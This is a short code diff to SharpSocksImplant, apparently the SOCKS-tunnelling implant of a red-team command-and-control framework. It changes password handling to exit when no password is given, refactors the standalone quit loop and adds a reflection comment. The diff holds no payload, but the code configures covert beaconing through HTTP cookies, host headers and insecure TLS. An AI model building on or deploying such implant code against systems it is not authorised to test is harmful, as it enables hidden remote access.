@@ -7,7 +7,6 @@ using NDesk.Options;
 using SharpSocksImplant.Integration;
 using SharpSocksImplant.Logging;
 using SharpSocksImplant.Socks;
-using SharpSocksImplant.Utils;
 
 namespace SharpSocksImplant
 {
@@ -192,8 +191,8 @@ namespace SharpSocksImplant
                         SecureString securePassword;
                         if (string.IsNullOrWhiteSpace(password))
                         {
-                            Console.WriteLine("Please enter your proxy password: ");
-                            securePassword = ConsolePassword.ReadPasswordFromConsole();
+                            Console.WriteLine("Please specify a password");
+                            return;
                         }
                         else
                         {
@@ -252,13 +251,12 @@ namespace SharpSocksImplant
             _sock = PoshCreateProxy.CreateSocksController(serverUri, commandChannelId, hostHeader, userAgent, key, urlPaths, sessionCookieName, payloadCookieName,
                 timeBetweenReads, webProxy, beaconTime, COMMS, insecureTLS);
             _sock.Start();
-            if (standaloneMode)
-            {
-                Console.WriteLine("[x] to quit\r\n");
-                while ("x" != Console.ReadLine()) Thread.Sleep(5000);
-            }
+            if (!standaloneMode) return;
+            Console.WriteLine("[x] to quit\r\n");
+            while ("x" != Console.ReadLine()) Thread.Sleep(5000);
         }
 
+        // Gets called via reflection
         // ReSharper disable once UnusedMember.Global
         public static void StopSocks()
         {
